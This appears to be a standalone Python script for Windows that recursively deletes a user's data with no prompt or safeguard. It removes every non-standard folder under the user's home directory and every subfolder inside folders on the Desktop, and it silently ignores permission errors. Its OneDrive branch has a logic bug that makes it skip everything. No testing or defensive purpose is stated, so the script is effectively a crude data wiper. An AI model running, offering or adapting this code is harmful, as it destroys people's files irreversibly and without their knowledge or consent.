import os, shutil, time, random
#myfilelink = os.getcwd()
#windowslocation  =
#main file delete korte deoa jabe na
username = os.getlogin()
mainlink = f"C:\\Users\\"
mainliwithuser = mainlink + f"{username}\\"
desklink = mainliwithuser + f"Desktop"
os.chdir(mainliwithuser)
onedrive = mainliwithuser + "\\Onedrive"
onedrivedesktoplink = onedrive + f"\\Desktop"
listosmainliwithuser = os.listdir(mainliwithuser)
for new in listosmainliwithuser:
    if new == 'Templates' or new == 'Start Menu' or new == 'SendTo' or new == 'Recent' or new == 'PrintHood' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.regtrans-ms' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000001.regtrans-ms' or new == 'NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TM.blf' or new == 'ntuser.dat.LOG2' or new == 'ntuser.dat.LOG1' or new == 'NTUSER.DAT' or new == 'NetHood' or new == 'My Documents' or new == 'Local Settings' or new == 'Cookies' or new == 'Application Data' or new == 'AppData' or new == '.vscode' or new == 'ntuser.ini' or new == '3D Objects' or new == 'Contacts' or new == 'Desktop' or new == 'Documents' or new == 'Downloads' or new == 'Favorites' or new == 'Links' or new == 'Music' or new == 'OneDrive' or new == 'Pictures' or new == 'Saved Games' or new == 'Searches' or new == 'Videos':
        continue
    else:
        try:
            shutil.rmtree(new)
        except PermissionError:
            continue

try:
    os.chdir(mainliwithuser)
    listforfind_Desktop_OneDrive = os.listdir(mainliwithuser)
    if "Desktop" in listforfind_Desktop_OneDrive:
        os.chdir(desklink)
        listdesktop = os.listdir(os.getcwd())
        print(listdesktop)
        for transfar in listdesktop:
            if "." not in transfar:
                desktopfolderlink = desklink + f"\\{transfar}"
                os.chdir(desktopfolderlink)

                listintodeskfolder = os.listdir()
                print(listintodeskfolder)
                for intodeskfolder in listintodeskfolder:

                    if "." in intodeskfolder or "" == intodeskfolder or "vi" == intodeskfolder:
                        continue

                    else:
                        print(intodeskfolder)
                        shutil.rmtree(intodeskfolder)
                    # elif
                print(os.getcwd())
    elif "Onedrive" in listforfind_Desktop_OneDrive and "Desktop" not in listforfind_Desktop_OneDrive:
        os.chdir(onedrive)
        try:
            os.chdir(onedrivedesktoplink)
            listofonedrivedektop = os.listdir(os.getcwd())
            for transfreondridesk in listofonedrivedektop:
                if "." in transfreondridesk or "" in transfreondridesk:

                    continue
                else:
                    shutil.rmtree(transfreondridesk)
        except:
            print("I can't")
            time.sleep(5)
        print(os.getcwd())

except:
    #time.sleep(10)
    print("Error")
